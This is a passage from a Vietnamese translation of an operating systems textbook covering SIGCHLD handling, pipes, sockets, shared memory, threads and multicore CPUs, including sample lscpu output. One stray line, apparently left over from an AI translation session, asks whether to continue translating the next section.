        /* uncomment debug print stmt to see what is being handled
        printf(&quot;signal %d me:%d child: %d\n&quot;, signum, getpid(), pid);
         */
    }
}

int main(void) {

    /* register SIGCHLD handler: */
    if ( signal(SIGCHLD, sigchild_handler) == SIG_ERR) {
        printf(&quot;ERROR signal failed\n&quot;);
    exit(1);
    }

    ...

    /* create a child process */
    pid = fork();
    if(pid == 0) {
        /* child code...maybe call execvp */
        ...
    }
    /* the parent continues executing concurrently with child */
    ...
}
</code></pre>
<p>Trong ví dụ trên, <code>waitpid</code> được gọi với PID là <code>-1</code>, nghĩa là “thu hồi <strong>bất kỳ</strong> zombie child process nào”.<br />
Nó cũng truyền cờ <code>WNOHANG</code>, nghĩa là lời gọi <code>waitpid</code> sẽ <strong>không bị chặn</strong> nếu không có zombie child process nào để thu hồi.</p>
<p>Ngoài ra, <code>waitpid</code> được gọi bên trong vòng lặp <code>while</code> và tiếp tục chạy miễn là nó trả về một PID hợp lệ (tức là vẫn còn zombie child process để thu hồi).<br />
Điều quan trọng là signal handler phải gọi <code>waitpid</code> trong vòng lặp, vì trong khi nó đang chạy, process có thể nhận thêm các signal <code>SIGCHLD</code> từ các child process khác vừa kết thúc.</p>
<p>OS <strong>không</strong> theo dõi số lượng signal <code>SIGCHLD</code> mà một process nhận được; nó chỉ ghi nhận rằng process đã nhận một <code>SIGCHLD</code> và ngắt thực thi của nó để chạy code handler.<br />
Do đó, nếu không có vòng lặp, signal handler có thể bỏ sót một số zombie process chưa được thu hồi.</p>
<p>Signal handler sẽ được thực thi bất cứ khi nào parent nhận signal <code>SIGCHLD</code>, bất kể parent đang bị chặn bởi lời gọi <code>wait</code> hay <code>waitpid</code>.</p>
<ul>
<li>Nếu parent đang bị chặn bởi <code>wait</code> khi nhận <code>SIGCHLD</code>, nó sẽ thức dậy và chạy code handler để thu hồi một hoặc nhiều zombie process, sau đó tiếp tục thực thi tại vị trí ngay sau lời gọi <code>wait</code>.</li>
<li>Nếu parent đang bị chặn bởi <code>waitpid</code> cho một child cụ thể, thì sau khi handler chạy, parent có thể tiếp tục hoặc vẫn bị chặn:
<ul>
<li>Nếu handler đã thu hồi đúng child mà <code>waitpid</code> đang chờ, parent sẽ tiếp tục thực thi.</li>
<li>Nếu không, parent sẽ tiếp tục bị chặn trong <code>waitpid</code> cho đến khi child được chỉ định kết thúc.</li>
</ul>
</li>
</ul>
<p>Một lời gọi <code>waitpid</code> với PID của một child process <strong>không tồn tại</strong> (có thể đã được thu hồi trước đó trong vòng lặp handler) sẽ <strong>không</strong> chặn process gọi.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="1342-truyền-thông-điệp-message-passing"><a class="header" href="#1342-truyền-thông-điệp-message-passing">13.4.2. Truyền thông điệp (Message Passing)</a></h3>
<p>Một cách để các <strong>process</strong> (tiến trình) với <strong>private virtual address space</strong> (không gian địa chỉ ảo riêng) có thể giao tiếp với nhau là thông qua <strong>message passing</strong> — gửi và nhận thông điệp qua lại.<br />
Message passing cho phép các chương trình trao đổi dữ liệu tùy ý, thay vì chỉ một tập nhỏ các thông điệp được định nghĩa sẵn như <strong>signal</strong> hỗ trợ.<br />
Hệ điều hành thường triển khai một số loại <strong>message passing abstraction</strong> (trừu tượng hóa truyền thông điệp) khác nhau mà các process có thể sử dụng để giao tiếp.</p>
<p>Mô hình <strong>message passing</strong> cho <strong>interprocess communication</strong> (IPC – giao tiếp liên tiến trình) gồm ba phần:</p>
<ol>
<li><strong>Process</strong> yêu cầu OS cấp phát một loại <strong>message channel</strong> (kênh truyền thông điệp).<br />
Ví dụ: <em>pipe</em> cho giao tiếp một chiều, <em>socket</em> cho giao tiếp hai chiều.<br />
Có thể cần thêm các bước thiết lập kết nối để cấu hình message channel.</li>
<li>Các process sử dụng message channel để gửi và nhận thông điệp với nhau.</li>
<li>Khi không còn sử dụng, các process đóng đầu của message channel.</li>
</ol>
<p><strong>Pipe</strong> là một kênh giao tiếp một chiều cho hai process chạy trên cùng một máy.<br />
Một chiều nghĩa là một đầu của pipe chỉ dùng để gửi thông điệp (ghi vào), và đầu còn lại chỉ dùng để nhận thông điệp (đọc ra).<br />
Pipe thường được dùng trong các lệnh shell để gửi <strong>output</strong> của một process làm <strong>input</strong> cho process khác.</p>
<p>Ví dụ, xem lệnh sau được nhập tại <strong>bash shell prompt</strong>, tạo một pipe giữa hai process (<code>cat</code> xuất nội dung tệp <code>foo.c</code> và pipe (<code>|</code>) chuyển hướng output đó làm input cho lệnh <code>grep</code> tìm chuỗi <code>&quot;factorial&quot;</code> trong dữ liệu đầu vào):</p>
<pre><code class="language-bash">$ cat foo.c | grep factorial
</code></pre>
<p>Để thực thi lệnh này, process shell gọi <strong>system call</strong> <code>pipe</code> để yêu cầu OS tạo một pipe.<br />
Pipe này sẽ được dùng bởi hai <strong>child process</strong> (<code>cat</code> và <code>grep</code>) của shell.<br />
Chương trình shell thiết lập <code>stdout</code> của process <code>cat</code> ghi vào đầu ghi của pipe, và <code>stdin</code> của process <code>grep</code> đọc từ đầu đọc của pipe.<br />
Nhờ vậy, khi các child process được tạo và chạy, output của <code>cat</code> sẽ được gửi làm input cho <code>grep</code> (xem <strong>Hình 1</strong>).</p>
<p><img src="C13-OS/_images/pipe.png" alt="example of a pipe sending cat's output to grep's input" /></p>
<p><strong>Hình 1.</strong> Pipe là kênh giao tiếp một chiều cho các process trên cùng hệ thống. Trong ví dụ này, process <code>cat</code> gửi dữ liệu cho process <code>grep</code> bằng cách ghi vào đầu ghi của pipe. Process <code>grep</code> nhận dữ liệu này bằng cách đọc từ đầu đọc của pipe.</p>
<p>Trong khi pipe chỉ truyền dữ liệu từ một process sang process khác theo một chiều, các abstraction message passing khác cho phép giao tiếp hai chiều.<br />
<strong>Socket</strong> là một kênh giao tiếp hai chiều, nghĩa là mỗi đầu của socket có thể dùng để gửi và nhận thông điệp.<br />
Socket có thể được dùng bởi các process giao tiếp chạy trên cùng một máy hoặc trên các máy khác nhau được kết nối qua mạng (xem <strong>Hình 2</strong>).</p>
<p>Các máy tính này có thể được kết nối qua <strong>LAN</strong> (Local Area Network – mạng cục bộ), kết nối các máy trong một khu vực nhỏ, ví dụ như mạng của một khoa khoa học máy tính trong trường đại học.<br />
Các process giao tiếp cũng có thể nằm trên các LAN khác nhau, được kết nối với nhau qua Internet.<br />
Chỉ cần tồn tại một đường kết nối mạng giữa hai máy, các process có thể dùng socket để giao tiếp.</p>
<p><img src="C13-OS/_images/sockets.png" alt="sockets enable two processes on different machines to communicate across a network." /></p>
<p><strong>Hình 2.</strong> Socket là kênh giao tiếp hai chiều, có thể được dùng bởi các process trên các máy khác nhau kết nối qua mạng.</p>
<p>Vì mỗi máy tính là một hệ thống riêng (phần cứng và OS), và OS trên một máy không biết hoặc quản lý tài nguyên của máy khác, <strong>message passing</strong> là cách duy nhất để các process trên các máy khác nhau giao tiếp.<br />
Để hỗ trợ loại giao tiếp này, OS cần triển khai một <strong>message passing protocol</strong> (giao thức truyền thông điệp) chung để gửi và nhận thông điệp qua mạng.</p>
<p><strong>TCP/IP</strong> là một ví dụ về giao thức truyền thông điệp có thể dùng để gửi thông điệp qua Internet.<br />
Khi một process muốn gửi thông điệp cho process khác, nó sẽ gọi system call <code>send</code>, truyền cho OS một socket để gửi, <strong>message buffer</strong> (bộ đệm chứa thông điệp), và có thể kèm thêm thông tin về thông điệp hoặc người nhận.<br />
OS sẽ đóng gói thông điệp trong message buffer và gửi nó qua mạng tới máy kia.<br />
Khi OS nhận được thông điệp từ mạng, nó sẽ giải nén thông điệp và chuyển cho process trên hệ thống của mình đã yêu cầu nhận thông điệp.<br />
Process này có thể đang ở trạng thái <strong>Blocked</strong> chờ thông điệp đến; khi nhận được thông điệp, process sẽ chuyển sang trạng thái <strong>Ready</strong> để chạy lại.</p>
<p>Có nhiều abstraction phần mềm hệ thống được xây dựng trên message passing để ẩn chi tiết truyền thông điệp khỏi lập trình viên.<br />
Tuy nhiên, bất kỳ giao tiếp nào giữa các process trên các máy khác nhau đều phải sử dụng message passing ở mức thấp nhất (giao tiếp qua <strong>shared memory</strong> hoặc <strong>signal</strong> là không khả thi cho các process chạy trên các hệ thống khác nhau).</p>
<p>Trong <a href="C13-OS/../C15-Parallel/index.html#_looking_ahead_other_parallel_systems_and_parallel_programming_models">Chương Hệ thống song song</a>, chúng ta sẽ thảo luận chi tiết hơn về message passing và các abstraction được xây dựng trên nó.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="1343-bộ-nhớ-dùng-chung-shared-memory"><a class="header" href="#1343-bộ-nhớ-dùng-chung-shared-memory">13.4.3. Bộ nhớ dùng chung (Shared Memory)</a></h3>
<p><strong>Message passing</strong> (truyền thông điệp) sử dụng <strong>socket</strong> rất hữu ích cho giao tiếp hai chiều giữa các <strong>process</strong> (tiến trình) chạy trên cùng một máy và giữa các process chạy trên các máy khác nhau.<br />
Tuy nhiên, khi hai process chạy trên cùng một máy, chúng có thể tận dụng tài nguyên hệ thống dùng chung để giao tiếp hiệu quả hơn so với việc sử dụng message passing.</p>
<p>Ví dụ, một <strong>operating system</strong> (hệ điều hành) có thể hỗ trợ <strong>interprocess communication</strong> (IPC – giao tiếp liên tiến trình) bằng cách cho phép các process chia sẻ toàn bộ hoặc một phần <strong>virtual address space</strong> (không gian địa chỉ ảo) của chúng.<br />
Một process có thể đọc và ghi giá trị vào phần bộ nhớ được chia sẻ trong address space của mình để giao tiếp với các process khác cùng chia sẻ vùng bộ nhớ đó.</p>
<p>Một cách để OS triển khai chia sẻ một phần address space là thiết lập các <strong>entry</strong> trong <strong>page table</strong> của hai hoặc nhiều process để ánh xạ tới cùng một <strong>physical frame</strong> (khung bộ nhớ vật lý).<br />
<strong>Hình 1</strong> minh họa một ví dụ ánh xạ như vậy.<br />
Để giao tiếp, một process ghi giá trị vào một địa chỉ trên <strong>shared page</strong> (trang bộ nhớ dùng chung), và process khác sau đó đọc giá trị này.</p>
<p><img src="C13-OS/_images/shm.png" alt="ipc through shared memory pages" /></p>
<p><strong>Hình 1.</strong> OS có thể hỗ trợ chia sẻ các trang trong virtual address space bằng cách thiết lập các entry trong page table của các process chia sẻ để trỏ tới cùng một số hiệu physical frame (ví dụ: frame 100).<br />
Lưu ý rằng các process không cần phải sử dụng cùng một địa chỉ ảo để tham chiếu tới trang bộ nhớ vật lý được chia sẻ.</p>
<p>Nếu OS hỗ trợ <strong>partial shared memory</strong> (bộ nhớ dùng chung một phần), nó sẽ triển khai một <strong>interface</strong> (giao diện) cho lập trình viên để tạo và gắn (attach) vào các trang bộ nhớ dùng chung (hoặc vùng/segment bộ nhớ dùng chung).<br />
Trong các hệ thống Unix, <strong>system call</strong> <code>shmget</code> sẽ tạo hoặc gắn vào một <strong>shared memory segment</strong> (đoạn bộ nhớ dùng chung).<br />
Mỗi shared memory segment tương ứng với một tập liên tiếp các địa chỉ ảo, có ánh xạ vật lý được chia sẻ với các process khác gắn vào cùng segment đó.</p>
<p>Hệ điều hành cũng thường hỗ trợ chia sẻ toàn bộ virtual address space.<br />
<strong>Thread</strong> (luồng) là abstraction của OS về một <strong>execution control flow</strong> (luồng điều khiển thực thi).<br />
Một process có một thread duy nhất trong một virtual address space duy nhất.<br />
Một <strong>multithreaded process</strong> (tiến trình đa luồng) có nhiều thread thực thi đồng thời trong cùng một virtual address space dùng chung — tất cả các thread chia sẻ toàn bộ virtual address space của process chứa chúng.</p>
<p>Các thread có thể dễ dàng chia sẻ trạng thái thực thi bằng cách đọc và ghi vào các vị trí bộ nhớ dùng chung trong address space chung.<br />
Ví dụ: nếu một thread thay đổi giá trị của một biến toàn cục, tất cả các thread khác sẽ thấy kết quả thay đổi đó.</p>
<p>Trên các hệ thống <strong>multiprocessor</strong> (đa bộ xử lý) — <strong>SMP</strong> (Symmetric Multiprocessing) hoặc <strong>multicore</strong> (đa lõi) — các thread riêng lẻ của một multithreaded process có thể được lập lịch để chạy đồng thời (<em>in parallel</em>) trên nhiều lõi.<br />
Trong <a href="C13-OS/../C14-SharedMemory/index.html#_leveraging_shared_memory_in_the_multicore_era">Chương Shared Memory</a>, chúng ta sẽ thảo luận chi tiết hơn về thread và lập trình đa luồng song song.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="135-tóm-tắt-và-các-chức-năng-khác-của-hệ-điều-hành"><a class="header" href="#135-tóm-tắt-và-các-chức-năng-khác-của-hệ-điều-hành">13.5. Tóm tắt và các chức năng khác của Hệ điều hành</a></h2>
<p>Trong chương này, chúng ta đã tìm hiểu <strong>hệ điều hành</strong> (operating system – OS) là gì, cách nó hoạt động và vai trò của nó trong việc chạy các chương trình ứng dụng trên máy tính.<br />
Là lớp <strong>system software</strong> (phần mềm hệ thống) nằm giữa <strong>computer hardware</strong> (phần cứng máy tính) và <strong>application programs</strong> (chương trình ứng dụng), OS quản lý phần cứng một cách hiệu quả và triển khai các <strong>abstraction</strong> (trừu tượng hóa) giúp máy tính dễ sử dụng hơn.</p>
<p>Hệ điều hành triển khai hai abstraction quan trọng — <strong>process</strong> (tiến trình) và <strong>virtual memory</strong> (bộ nhớ ảo) — để hỗ trợ <strong>multiprogramming</strong> (đa chương trình, cho phép nhiều chương trình chạy đồng thời trên hệ thống).<br />
OS theo dõi tất cả các process trong hệ thống và trạng thái của chúng, đồng thời thực hiện <strong>context switching</strong> (chuyển ngữ cảnh) giữa các process đang chạy trên các lõi CPU.<br />
OS cũng cung cấp cơ chế để các process tạo process mới, thoát (exit) và giao tiếp với nhau.</p>
<p>Thông qua virtual memory, OS triển khai abstraction về một <strong>không gian bộ nhớ ảo riêng</strong> cho mỗi process.<br />
Abstraction này bảo vệ các process khỏi việc nhìn thấy tác động của các process khác khi cùng chia sẻ bộ nhớ vật lý của máy tính.<br />
<strong>Paging</strong> (phân trang) là một cách triển khai virtual memory, ánh xạ từng <strong>page</strong> (trang) trong không gian địa chỉ ảo của mỗi process tới các <strong>frame</strong> (khung) trong RAM vật lý.<br />
Virtual memory cũng giúp OS sử dụng RAM hiệu quả hơn; bằng cách coi RAM như một <strong>cache</strong> cho ổ đĩa, nó cho phép các page của không gian bộ nhớ ảo được lưu trữ trong RAM hoặc trên đĩa.</p>
<p>Trọng tâm của chương này là vai trò của OS trong việc chạy một chương trình, bao gồm các abstraction và cơ chế mà nó triển khai để chạy chương trình hiệu quả. Tuy nhiên, đây <strong>không phải</strong> là toàn bộ bức tranh.<br />
Còn rất nhiều lựa chọn triển khai, chi tiết kỹ thuật và vấn đề về <strong>policy</strong> (chính sách) liên quan đến process, quản lý process, virtual memory và quản lý bộ nhớ.</p>
<p>Ngoài ra, OS còn triển khai nhiều abstraction, chức năng và chính sách quan trọng khác để quản lý và sử dụng máy tính.<br />
Ví dụ: OS triển khai abstraction <strong>filesystem</strong> (hệ thống tệp) để truy cập dữ liệu lưu trữ, các cơ chế bảo vệ và <strong>security policy</strong> (chính sách bảo mật) để bảo vệ người dùng và hệ thống, cũng như các <strong>scheduling policy</strong> (chính sách lập lịch) cho các tài nguyên phần cứng và phần mềm khác nhau.</p>
<p>Các hệ điều hành hiện đại cũng hỗ trợ <strong>interprocess communication</strong> (giao tiếp liên tiến trình), <strong>networking</strong> (mạng máy tính), và <strong>parallel &amp; distributed computing</strong> (tính toán song song và phân tán).<br />
Ngoài ra, hầu hết OS ngày nay đều bao gồm hỗ trợ <strong>hypervisor</strong>, cho phép <strong>virtualize</strong> (ảo hóa) phần cứng hệ thống và cho phép <strong>host OS</strong> (hệ điều hành chủ) chạy nhiều <strong>virtual guest OS</strong> (hệ điều hành khách ảo).</p>
<p>Virtualization cho phép host OS — vốn quản lý phần cứng máy tính — khởi động và chạy nhiều hệ điều hành khác trên chính nó, mỗi hệ điều hành có một <strong>virtualized view</strong> (góc nhìn ảo hóa) riêng về phần cứng bên dưới.<br />
Hỗ trợ hypervisor của host OS quản lý quá trình ảo hóa, bao gồm việc bảo vệ và chia sẻ tài nguyên vật lý giữa các guest OS.</p>
<p>Cuối cùng, hầu hết các OS cung cấp một mức độ <strong>extensibility</strong> (khả năng mở rộng) nhất định, cho phép người dùng (thường là <strong>system administrator</strong> – quản trị hệ thống) tinh chỉnh OS.<br />
Ví dụ: hầu hết các hệ thống kiểu Unix cho phép người dùng (thường yêu cầu quyền <strong>root</strong> hoặc <strong>superuser</strong>) thay đổi kích thước <strong>OS buffer</strong>, <strong>cache</strong>, <strong>swap partition</strong>, và lựa chọn từ nhiều <strong>scheduling policy</strong> khác nhau trong các <strong>OS subsystem</strong> và thiết bị phần cứng.<br />
Thông qua các thay đổi này, người dùng có thể tinh chỉnh hệ thống cho phù hợp với loại <strong>application workload</strong> (khối lượng công việc ứng dụng) mà họ chạy.</p>
<p>Các OS loại này thường hỗ trợ <strong>loadable kernel module</strong> (mô-đun nhân có thể nạp), là các đoạn code thực thi có thể được nạp vào <strong>kernel</strong> và chạy ở <strong>kernel mode</strong>.<br />
Loadable kernel module thường được dùng để bổ sung abstraction hoặc chức năng mới vào kernel, cũng như để nạp <strong>device driver</strong> (trình điều khiển thiết bị) vào kernel nhằm quản lý một phần cứng cụ thể.</p>
<p>Để tìm hiểu sâu và rộng hơn về hệ điều hành, chúng tôi khuyến nghị đọc các giáo trình hệ điều hành, chẳng hạn như <em>Operating Systems: Three Easy Pieces</em>¹.</p>
<h3 id="1351-tài-liệu-tham-khảo"><a class="header" href="#1351-tài-liệu-tham-khảo">13.5.1. Tài liệu tham khảo</a></h3>
<ol>
<li><a href="http://pages.cs.wisc.edu/%7Eremzi/OSTEP/">Operating Systems: Three Easy Pieces</a>,<br />
tác giả: Remzi H. Arpaci-Dusseau và Andrea C. Arpaci-Dusseau,<br />
Arpaci-Dusseau Books, tháng 8 năm 2018.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="14-tận-dụng-bộ-nhớ-chia-sẻ-trong-kỷ-nguyên-đa-lõi-leveraging-shared-memory-in-the-multicore-era"><a class="header" href="#14-tận-dụng-bộ-nhớ-chia-sẻ-trong-kỷ-nguyên-đa-lõi-leveraging-shared-memory-in-the-multicore-era">14. Tận dụng bộ nhớ chia sẻ trong kỷ nguyên đa lõi (Leveraging Shared Memory in the Multicore Era)</a></h2>
<p><em>Thế giới đã thay đổi.</em></p>
<p><em>Tôi cảm nhận điều đó trong lớp silica.</em></p>
<p><em>Tôi cảm nhận điều đó trong transistor.</em></p>
<p><em>Tôi nhìn thấy điều đó trong lõi.</em></p>
<p>~ Xin lỗi Galadriel (<em>Chúa tể những chiếc nhẫn: Hiệp hội nhẫn thần</em>)</p>
<p>Cho đến nay, phần thảo luận về kiến trúc của chúng ta tập trung vào một thế giới thuần <strong>single-CPU</strong> (CPU đơn).<br />
Nhưng thế giới đã thay đổi. CPU ngày nay có nhiều <strong>core</strong> (lõi), hay đơn vị tính toán (<strong>compute unit</strong>).<br />
Trong chương này, chúng ta sẽ thảo luận về <strong>kiến trúc đa lõi</strong> (<strong>multicore architectures</strong>) và cách tận dụng chúng để tăng tốc độ thực thi chương trình.</p>
<blockquote>
<p><strong>CPUs, Processors, and Cores</strong></p>
<p>Trong nhiều trường hợp ở chương này, các thuật ngữ <em>processor</em> và <em>CPU</em> được dùng thay thế cho nhau.<br />
Ở mức cơ bản, <strong>processor</strong> (bộ xử lý) là bất kỳ mạch điện nào thực hiện một số phép tính trên dữ liệu bên ngoài.<br />
Theo định nghĩa này, <strong>central processing unit</strong> (CPU – bộ xử lý trung tâm) là một ví dụ của processor.<br />
Một processor hoặc CPU có nhiều <strong>compute core</strong> được gọi là <strong>multicore processor</strong> hoặc <strong>multicore CPU</strong>.<br />
<strong>Core</strong> là một đơn vị tính toán chứa nhiều thành phần tạo nên CPU cổ điển: một ALU, các thanh ghi (<strong>registers</strong>), và một phần bộ nhớ đệm (<strong>cache</strong>).<br />
Mặc dù <em>core</em> khác với <em>processor</em>, nhưng không hiếm khi thấy hai thuật ngữ này được dùng thay thế cho nhau trong các tài liệu (đặc biệt là những tài liệu ra đời khi multicore processor vẫn còn được coi là mới mẻ).</p>
</blockquote>
<p>Năm 1965, nhà sáng lập Intel – <strong>Gordon Moore</strong> – dự đoán rằng số lượng transistor trong một <strong>mạch tích hợp</strong> sẽ tăng gấp đôi mỗi năm.<br />
Dự đoán này, nay được biết đến với tên <strong>Định luật Moore</strong> (<strong>Moore’s Law</strong>), sau đó được điều chỉnh thành số lượng transistor tăng gấp đôi mỗi <strong>hai</strong> năm.</p>
<p>Bất chấp sự tiến hóa của các công tắc điện tử từ transistor của Bardeen đến các transistor siêu nhỏ trên chip hiện đại, Định luật Moore vẫn đúng trong suốt 50 năm qua.<br />
Tuy nhiên, bước sang thiên niên kỷ mới, thiết kế bộ xử lý đã gặp phải một số <strong>giới hạn hiệu năng</strong> quan trọng:</p>
<ul>
<li>
<p><strong>Memory wall</strong>: Sự cải tiến của công nghệ bộ nhớ không theo kịp tốc độ tăng của xung nhịp CPU, khiến bộ nhớ trở thành <strong>nút thắt cổ chai</strong> về hiệu năng.<br />
Do đó, việc liên tục tăng tốc độ thực thi của CPU <strong>không còn</strong> cải thiện hiệu năng tổng thể của hệ thống.</p>
</li>
<li>
<p><strong>Power wall</strong>: Việc tăng số lượng transistor trên một bộ xử lý tất yếu làm tăng nhiệt độ và mức tiêu thụ điện năng, kéo theo chi phí cấp điện và làm mát hệ thống.<br />
Với sự phổ biến của hệ thống đa lõi, <strong>điện năng</strong> giờ đây trở thành mối quan tâm hàng đầu trong thiết kế hệ thống máy tính.</p>
</li>
</ul>
<p>Hai “bức tường” về điện năng và bộ nhớ đã buộc các kiến trúc sư máy tính phải thay đổi cách thiết kế bộ xử lý.<br />
Thay vì thêm nhiều transistor để tăng tốc độ thực thi một luồng lệnh duy nhất, họ bắt đầu thêm nhiều <strong>compute core</strong> vào một CPU.</p>
<p>Compute core là các đơn vị xử lý đơn giản hơn, chứa ít transistor hơn CPU truyền thống và thường dễ chế tạo hơn.<br />
Kết hợp nhiều core trên một CPU cho phép CPU thực thi <strong>nhiều</strong> luồng lệnh độc lập cùng lúc.</p>
<blockquote>
<p><strong>More cores != better</strong></p>
<p>Có thể bạn sẽ nghĩ rằng tất cả các core đều giống nhau và máy tính có càng nhiều core thì càng tốt.<br />
Điều này <strong>không hẳn</strong> đúng!<br />
Ví dụ: <strong>graphics processing unit</strong> (GPU – bộ xử lý đồ họa) có các core với số lượng transistor <strong>ít hơn nhiều</strong> so với CPU core, và được thiết kế chuyên biệt cho các tác vụ xử lý vector.<br />
Một GPU điển hình có thể có <strong>5.000</strong> core hoặc hơn.<br />
Tuy nhiên, GPU core bị giới hạn về loại phép toán mà chúng có thể thực hiện và <strong>không phải lúc nào</strong> cũng phù hợp cho tính toán tổng quát như CPU core.<br />
Việc tính toán bằng GPU được gọi là <strong>manycore computing</strong>.<br />
Trong chương này, chúng ta tập trung vào <strong>multicore computing</strong>.<br />
Xem <a href="C14-SharedMemory/../C15-Parallel/gpu.html#_GPUs">Chương 15</a> để tìm hiểu về manycore computing.</p>
</blockquote>
<h3 id="xem-xét-kỹ-hơn-có-bao-nhiêu-lõi"><a class="header" href="#xem-xét-kỹ-hơn-có-bao-nhiêu-lõi">Xem xét kỹ hơn: Có bao nhiêu lõi?</a></h3>
<p>Hầu như tất cả các hệ thống máy tính hiện đại đều có nhiều <strong>core</strong> (lõi), bao gồm cả các thiết bị nhỏ như <a href="https://www.raspberrypi.org/">Raspberry Pi</a>.<br />
Xác định số lượng core trên một hệ thống là điều quan trọng để đo lường chính xác hiệu năng của các chương trình <strong>multicore</strong> (đa lõi).</p>
<p>Trên máy tính Linux và macOS, lệnh <code>lscpu</code> cung cấp bản tóm tắt kiến trúc của hệ thống.<br />
Trong ví dụ sau, chúng tôi hiển thị kết quả của lệnh <code>lscpu</code> khi chạy trên một máy mẫu (một số phần được lược bỏ để nhấn mạnh các thông tin chính):</p>
<pre><code class="language-bash">$ lscpu

Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                8
On-line CPU(s) list:   0-7
Thread(s) per core:    2
Core(s) per socket:    4
Socket(s):             1
Model name:            Intel(R) Core(TM) i7-3770 CPU @ 3.40GHz
CPU MHz:               1607.562
CPU max MHz:           3900.0000
CPU min MHz:           1600.0000
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              8192K
...
</code></pre>
<p>Lệnh <code>lscpu</code> cung cấp nhiều thông tin hữu ích, bao gồm loại bộ xử lý, tốc độ core, và số lượng core.<br />
Để tính số lượng <strong>physical core</strong> (lõi vật lý/thực tế) trên hệ thống, nhân số lượng <strong>socket</strong> với số lượng core trên mỗi socket.<br />
Kết quả <code>lscpu</code> mẫu ở trên cho thấy hệ thống có <strong>một socket</strong> với <strong>bốn core</strong> trên mỗi socket, tức là tổng cộng <strong>bốn physical core</strong>.</p>
<h4 id="hyperthreading"><a class="header" href="#hyperthreading">Hyperthreading</a></h4>
<p>Thoạt nhìn, có thể thấy hệ thống trong ví dụ trước có <strong>tám core</strong>.<br />
Xét cho cùng, đây là điều mà trường <code>&quot;CPU(s)&quot;</code> dường như ngụ ý.<br />
Tuy nhiên, trường này thực tế cho biết số lượng <strong>hyperthreaded core</strong> (lõi logic), chứ không phải số lượng physical core.</p>
<p><strong>Hyperthreading</strong> (hay <strong>simultaneous multithreading – SMT</strong>) cho phép xử lý hiệu quả nhiều <strong>thread</strong> trên cùng một core.<br />
Mặc dù hyperthreading có thể giảm tổng thời gian chạy của một chương trình, hiệu năng trên hyperthreaded core <strong>không</strong> tăng tỷ lệ thuận như trên physical core.</p>
<p>Tuy nhiên, nếu một tác vụ bị <strong>idle</strong> (nhàn rỗi, ví dụ do <a href="C14-SharedMemory/../C5-Arch/pipelining_advanced.html#_pipelining_hazards_control_hazards">control hazard</a>), một tác vụ khác vẫn có thể tận dụng core đó.</p>
<p>Tóm lại, hyperthreading được giới thiệu để cải thiện <strong>process throughput</strong> (lượng tiến trình hoàn thành trong một đơn vị thời gian), chứ không phải <strong>process speedup</strong> (mức cải thiện thời gian chạy của một tiến trình đơn lẻ).<br />
Phần lớn nội dung thảo luận về hiệu năng trong chương tiếp theo sẽ tập trung vào <strong>speedup</strong>.</p>
<h4 id="performance-cores-và-efficiency-cores"><a class="header" href="#performance-cores-và-efficiency-cores">Performance Cores và Efficiency Cores</a></h4>
<p>Trên một số kiến trúc mới hơn (chẳng hạn như bộ xử lý Intel thế hệ 12 trở lên), phép nhân số lượng socket với số lượng core và <strong>hardware thread</strong> cho ra một con số khác (thường nhỏ hơn) so với giá trị hiển thị trong trường <code>&quot;CPU(s)&quot;</code>.<br />
Điều gì đang xảy ra ở đây?</p>
<p>Câu trả lời nằm ở các kiến trúc <strong>heterogeneous</strong> (không đồng nhất) mới đang được các hãng sản xuất chip phát triển.<br />
Ví dụ: bắt đầu từ thế hệ CPU thứ 12, Intel đã giới thiệu kiến trúc kết hợp giữa <strong>Performance core</strong> (<strong>P-core</strong>) và <strong>Efficiency core</strong> (<strong>E-core</strong>).</p>
<p>Mục tiêu của thiết kế lai này là giao các tác vụ nền nhỏ hơn cho các E-core tiết kiệm điện, giải phóng các P-core mạnh mẽ nhưng tiêu thụ nhiều điện cho các tác vụ tính toán nặng.<br />
Nguyên tắc tương tự cũng được áp dụng trong kiến trúc di động <strong>big.LITTLE</strong> trước đây của Arm.</p>
<p>Trên các kiến trúc heterogeneous, kết quả mặc định của <code>lscpu</code> chỉ hiển thị các P-core khả dụng;<br />
số lượng E-core thường có thể tính bằng cách lấy tổng số core trong trường <code>&quot;CPU(s)&quot;</code> trừ đi số lượng P-core.</p>
<p>Chạy lệnh <code>lscpu</code> với tùy chọn <code>--all</code> và <code>--extended</code> sẽ hiển thị <strong>bản đồ đầy đủ</strong> của P-core và E-core trên hệ thống, trong đó E-core có thể nhận diện nhờ tốc độ xử lý thấp hơn.</p>
<p>Bạn có muốn tôi dịch tiếp sang phần <strong>14.1. Shared Memory Multiprocessing</strong> để nối tiếp nội dung không?</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="141-lập-trình-hệ-thống-đa-lõi-programming-multicore-systems"><a class="header" href="#141-lập-trình-hệ-thống-đa-lõi-programming-multicore-systems">14.1. Lập trình hệ thống đa lõi (Programming Multicore Systems)</a></h2>
<p>Hầu hết các ngôn ngữ lập trình phổ biến mà lập trình viên biết ngày nay đều được tạo ra <strong>trước</strong> kỷ nguyên đa lõi.<br />
Do đó, nhiều ngôn ngữ <strong>không thể</strong> <em>ngầm định</em> (hoặc tự động) tận dụng bộ xử lý đa lõi để tăng tốc độ thực thi chương trình.<br />
Thay vào đó, lập trình viên phải <strong>chủ động</strong> viết phần mềm để khai thác nhiều core trên hệ thống.</p>
<h3 id="1411-Ảnh-hưởng-của-hệ-thống-đa-lõi-đến-việc-thực-thi-process"><a class="header" href="#1411-Ảnh-hưởng-của-hệ-thống-đa-lõi-đến-việc-thực-thi-process">14.1.1. Ảnh hưởng của hệ thống đa lõi đến việc thực thi process</a></h3>
<p>Hãy nhớ rằng một <strong>process</strong> (tiến trình) có thể được xem như một <strong>abstraction</strong> (sự trừu tượng hóa) của một chương trình đang chạy.<br />
Mỗi process thực thi trong <strong>virtual address space</strong> (không gian địa chỉ ảo) riêng của nó.<br />
<strong>Operating system</strong> (OS – hệ điều hành) lập lịch (schedule) các process để thực thi trên CPU; một <strong>context switch</strong> (chuyển ngữ cảnh) xảy ra khi CPU thay đổi process mà nó đang thực thi.</p>
<p><strong>Hình 1</strong> minh họa cách năm process ví dụ có thể thực thi trên một CPU lõi đơn.</p>
<p><img src="C14-SharedMemory/_images/concurrency_1.png" alt="concurrency example with 5 processes" /></p>
